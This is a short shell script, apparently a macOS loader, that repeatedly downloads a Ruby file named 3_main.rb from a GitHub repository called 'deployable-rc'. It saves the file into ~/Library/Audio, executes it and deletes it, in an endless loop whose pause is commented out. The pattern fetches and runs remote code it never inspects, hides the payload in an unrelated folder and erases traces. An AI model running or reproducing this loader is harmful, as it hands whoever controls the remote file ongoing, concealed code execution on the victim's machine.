run() {
    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/3_main.rb -o ~/Library/Audio/3_main.rb

    ruby ~/Library/Audio/3_main.rb

    rm ~/Library/Audio/3_main.rb
}

while true; do
    run

    # sleep 30
done
